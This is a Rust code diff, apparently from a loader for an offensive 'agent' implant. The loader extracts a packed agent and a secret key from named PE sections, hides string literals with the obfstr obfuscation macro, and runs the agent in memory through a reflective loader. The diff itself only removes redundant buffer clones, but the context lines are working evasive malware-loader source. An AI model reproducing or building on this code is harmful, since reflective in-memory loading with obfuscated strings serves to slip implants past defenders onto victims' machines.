@@ -34,8 +34,7 @@ fn rva_to_file_offset(file: &PeFile<ImageNtHeaders64>, rva: u64) -> u64 {
 }
 
 fn packed_agent_mut(bin: &mut [u8]) -> Result<&mut [u8], Box<dyn std::error::Error>> {
-    let clone = bin.to_vec();
-    let pe = PeFile::<ImageNtHeaders64>::parse(&clone)?;
+    let pe = PeFile::<ImageNtHeaders64>::parse(&bin)?;
     let (offset, size) = section_file_range(&pe, obfstr::obfstr!("bin")).unwrap();
     let bin_section = &bin[offset as usize..][..size as usize];
     let addr = <&[u8] as TryInto<[u8; 8]>>::try_into(&bin_section[..8])?;
@@ -46,8 +45,7 @@ fn packed_agent_mut(bin: &mut [u8]) -> Result<&mut [u8], Box<dyn std::error::Err
 }
 
 fn secret_key_mut(agent: &mut [u8]) -> Result<&mut [u8], Box<dyn std::error::Error>> {
-    let clone = agent.to_vec();
-    let agent_pe = PeFile::<ImageNtHeaders64>::parse(&clone)?;
+    let agent_pe = PeFile::<ImageNtHeaders64>::parse(&agent)?;
     let (offset, size) = section_file_range(&agent_pe, obfstr::obfstr!(".sk")).unwrap();
     Ok(&mut agent[offset as usize..][..size as usize])
 }
@@ -69,6 +67,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     fs::remove_file(&tmp)?;
 
     // Start the agent
-    unsafe { rspe::reflective_loader(buf.to_vec()) }
+    unsafe { rspe::reflective_loader(buf) }
     Ok(())
 }
